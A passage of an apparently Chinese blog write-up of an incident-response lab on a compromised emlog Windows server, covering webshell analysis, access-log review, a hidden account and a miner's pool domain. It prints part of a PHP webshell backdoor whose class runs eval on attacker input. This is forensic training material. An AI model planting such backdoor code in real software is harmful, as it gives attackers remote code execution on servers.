class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;<span class="comment">#这个类定义了一个魔术方法 __invoke，它接受一个参数 $p 并执行 eval($p.&quot;&quot;);。</span></span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);<span class="comment"># 调用类 C 的实例，并将参数 $params 传递给它</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码实际上是一个加密的后门程序。它通过接收加密的数据，然后解密并执行其中的 PHP 代码。这使得攻击者可以通过发送特定的加密请求来执行任意的 PHP 代码，从而完全控制服务器。</p>
+<p>主要危险点包括：</p>
+<ul>
+<li><p>使用 eval 函数执行任意 PHP 代码。</p>
+</li>
+<li><p>通过加密隐藏恶意代码，难以被普通的扫描工具检测到。</p>
+</li>
+<li><p>利用会话和加密机制，使得攻击通信难以被识别和拦截。</p>
+</li>
+</ul>
+<p>这种后门程序常用于网络攻击中的持久访问，通过隐蔽手段保持对受感染服务器的控制。</p>
+<h3 id="问题2-通过本地-PC-RDP到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#问题2-通过本地-PC-RDP到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="问题2:通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;"></a>问题2:通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</h3><p>又回到分析ip了，那就又得去分析我们的日志文件了，那我们找一下phpstudy存放日志的文件目录</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203154041711.png" alt="image-20241203154041711"></p>
+<p>在Extensions目录下，有Apache和Nginx的日志文件，但是我们这里的话是分析Apache日志文件哈，因为Nginx日志文件的大小都是0，也就是空的，所以我们就没必要看了</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203154220409.png" alt="image-20241203154220409"></p>
+<p>然后我们来看Apache的日志文件，在logs路径下</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203154318690.png" alt="image-20241203154318690"></p>
+<p>可以看到有很多文件都是空的，且有一个access.log文件的大小是很大的，初步确定是在这个文件里面,然后我们打开进行日志分析</p>
+<p>因为之前我们确定了植入shell的文件叫shell.php，所以我直接搜索shell.php文件有没有被利用的痕迹</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203154705984.png" alt="image-20241203154705984"></p>
+<p>确实存在哈，那我们跟进分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">192.168.126.1 - - [26/Feb/2024:22:46:23 +0800] &quot;GET /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:46:35 +0800] &quot;POST /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:46:35 +0800] &quot;POST /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:46:35 +0800] &quot;GET /content/plugins/tips/shell.php?888666=619 HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:47:54 +0800] &quot;POST /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:47:54 +0800] &quot;POST /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:48:47 +0800] &quot;POST /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line"></span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:49:58 +0800] &quot;GET /content/plugins/tips/shell.php?nzQbavYgN6ODoxF1=G65ASv8y3UvkREqS1BhtN8ZQ9rBOTuYm&amp;YD2ZXadPSvHEOYc2=Mtp8qcxNdDLrUSDD7WH6NZB9LGuhPYLT&amp;888666=7Sn1K3PXNdf2Fh0LymWfQDymalxp4ty1&amp;Y0fAQLYotO6P9ZRM=dj3DhH6k3adKnymgE07L8YUSXjdkX4vx&amp;pV8lXaCzdJhmssdK=V4VdNXaxzvxXLdkEB9DTv7Bqbg3qw92J HTTP/1.1&quot; 200 -</span><br><span class="line">24:22:50:33 +0800] &quot;GET /content/plugins/tips/shell.php?AMKhtlTTEMKCZN5T=VbN2ItDmt0cZsJ8nFYFjPG8JpJHhNyqg&amp;NQxMQd88ByKdwKQF=5vlwUtyYSChArIsZ3ajO6Jxzx7vRJuHl&amp;888666=XSXMdgEcy5mYZOn9L4RoWLbwYo9nTxgr&amp;htdk7suOo2SdXKmV=10I1HotZgl6Y50OMPTZRfKOMV1oVbQky&amp;pp4TqWAlQHyYQdb1=rFVrQrbQT3VMlwPZxrnKVOekDCUcVeiX HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:51:58 +0800] &quot;POST /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:51:58 +0800] &quot;POST /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:51:58 +0800] &quot;GET /content/plugins/tips/shell.php?888666=395 HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:52:17 +0800] &quot;POST /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:52:17 +0800] &quot;POST /content/plugins/tips/shell.php HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.126.1 - - [26/Feb/2024:22:52:17 +0800] &quot;GET /content/plugins/tips/shell.php?888666=331 HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+
+<p>这里不难看出，黑客对植入的shell.php有过多次的请求访问，基于上面对shell.php的分析，这说明黑客可能在利用这个shell去进行远程代码执行或文件操作，这是一种典型的webshell攻击，所以这里的话应是黑客攻击成功了对shell进行利用并对我们的靶机进行了一定的攻击操作，那前面的ip就是黑客的ip</p>
+<h3 id="问题3：通过本地-PC-RDP到服务器并且分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交"><a href="#问题3：通过本地-PC-RDP到服务器并且分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交" class="headerlink" title="问题3：通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;"></a>问题3：通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;</h3><p>这里让我们去找黑客的隐藏账户名称，既然说用户名称了，那肯定就是查靶机的用户组了呗（window应急的基础操作），“本地用户和组”是在“计算机管理”里面，想找到“计算机管理”其实也简单，直接在搜索栏搜索即可；</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203155436176.png" alt="image-20241203155436176"></p>
+<p>或者我们在c盘的用户里面也可以进行查找</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203155514683.png" alt="image-20241203155514683"></p>
+<p><strong>当然，也可以直接使用“net user”进行查询计算机的所有用户，但是这里好像隐藏了，并没有发现；</strong></p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160143326.png" alt="image-20241203160143326"></p>
+<p>flag{hacker138}</p>
+<h3 id="问题4-通过本地-PC-RDP到服务器并且分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交"><a href="#问题4-通过本地-PC-RDP到服务器并且分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交" class="headerlink" title="问题4:通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;"></a>问题4:通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</h3><p>既然我们知道了黑客的隐藏账户，那我们跟进分析</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160456107.png" alt="image-20241203160456107"></p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160506963.png" alt="image-20241203160506963"></p>
+<p>然后在桌面找到了一个kuang的应用程序，<strong>那如何找到矿的域池名呢？</strong></p>
+<p>既然现在已经知道挖矿程序了（kuang.exe），那我们直接使用脚本工具“pyinstxtractor.py”把kuang.exe转换成pyc文件，接着随便找一个pyc在线反编译即可发现池域名</p>
+<p>我们将kuang程序放到我们的<strong>脚本工具“pyinstxtractor”目录下；</strong></p>
+<p><strong><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160847501.png" alt="image-20241203160847501"></strong></p>
+<p>然后在当前目录下的终端去运行脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py Kuang.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203160953764.png" alt="image-20241203160953764"></p>
+<p>然后我们进入这个文件，找到我们想要的pyc文件</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203161111521.png" alt="image-20241203161111521"></p>
+<p>然后放到在线pyc反编译的网站进行反编译</p>
+<p><a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/image-20241203161519487.png" alt="image-20241203161519487"></p>
+<p>然后就可以看到我们想要的域名</p>
+<p>所以最后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="第四章-windows日志分析"><a href="#第四章-windows日志分析" class="headerlink" title="第四章-windows日志分析"></a>第四章-windows日志分析</h2>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">0x02正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-%E5%90%91%E6%97%A5%E8%91%B5"><span class="toc-number">2.1.</span> <span class="toc-text">第四章 windows实战-向日葵</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E8%BD%AF%E4%BB%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">向日葵远程连接软件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%91%E6%97%A5%E8%91%B5%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">向日葵的主要功能</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA"><span class="toc-number">2.1.2.</span> <span class="toc-text">连接靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E9%A6%96%E6%AC%A1%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%E7%9A%84%E6%97%B6%E9%97%B4%E4%B8%BA%E5%A4%9A%E5%B0%91"><span class="toc-number">2.1.3.</span> <span class="toc-text">问题1:通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E7%9A%84-IP-%E4%B8%BA%E5%A4%9A%E5%B0%91"><span class="toc-number">2.1.4.</span> <span class="toc-text">问题2:通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E6%89%98%E7%AE%A1%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F-IP-%E4%B8%BA"><span class="toc-number">2.1.5.</span> <span class="toc-text">问题3:通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E8%A7%A3%E5%AF%86-DEC-%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.6.</span> <span class="toc-text">问题4:找到黑客解密 DEC 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%985-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E8%A7%A3%E5%AF%86%E9%BB%91%E5%AE%A2%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6-%E5%B0%86%E6%A1%8C%E9%9D%A2%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E4%B8%AD%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%E4%BD%9C%E4%B8%BA-FLAG-%E6%8F%90%E4%BA%A4"><span class="toc-number">2.1.7.</span> <span class="toc-text">问题5:通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-emlog"><span class="toc-number">2.2.</span> <span class="toc-text">第四章 windows实战-emlog</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFemlog%EF%BC%9F"><span class="toc-number">2.2.1.</span> <span class="toc-text">什么是emlog？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#emlog%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">2.2.2.</span> <span class="toc-text">emlog的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.2.3.</span> <span class="toc-text">应用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">连接靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E6%89%BE%E5%88%B0%E9%BB%91%E5%AE%A2%E6%A4%8D%E5%85%A5-shell-%E5%B0%86%E9%BB%91%E5%AE%A2%E6%A4%8D%E5%85%A5-shell-%E7%9A%84%E5%AF%86%E7%A0%81%E6%8F%90%E4%BA%A4"><span class="toc-number">2.2.5.</span> <span class="toc-text">问题1:通过本地 PC RDP到服务器并且找到黑客植入 shell,,将黑客植入 shell 的密码提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%E7%9A%84-IP-%E4%B8%BA%E5%A4%9A%E5%B0%91-%E5%B0%86%E9%BB%91%E5%AE%A2-IP-%E4%BD%9C%E4%B8%BA-FLAG-%E6%8F%90%E4%BA%A4"><span class="toc-number">2.2.6.</span> <span class="toc-text">问题2:通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%983%EF%BC%9A%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%9A%84%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E5%90%8D%E7%A7%B0-%E5%B0%86%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA-FLAG-%E6%8F%90%E4%BA%A4"><span class="toc-number">2.2.7.</span> <span class="toc-text">问题3：通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0-PC-RDP%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%B8%94%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E7%9A%84%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%9F%BF%E6%B1%A0%E5%9F%9F%E5%90%8D-%E5%B0%86%E9%BB%91%E5%AE%A2%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%9F%BF%E6%B1%A0%E5%9F%9F%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA-%E4%BB%85%E5%9F%9F%E5%90%8D-FLAG-%E6%8F%90%E4%BA%A4"><span class="toc-number">2.2.8.</span> <span class="toc-text">问题4:通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">第四章-windows日志分析</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&text=玄机第四章windows实战"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&is_video=false&description=玄机第四章windows实战"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=玄机第四章windows实战&body=Check out this article: https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&title=玄机第四章windows实战"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&name=玄机第四章windows实战&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/12/02/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0windows%E5%AE%9E%E6%88%98/&t=玄机第四章windows实战"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
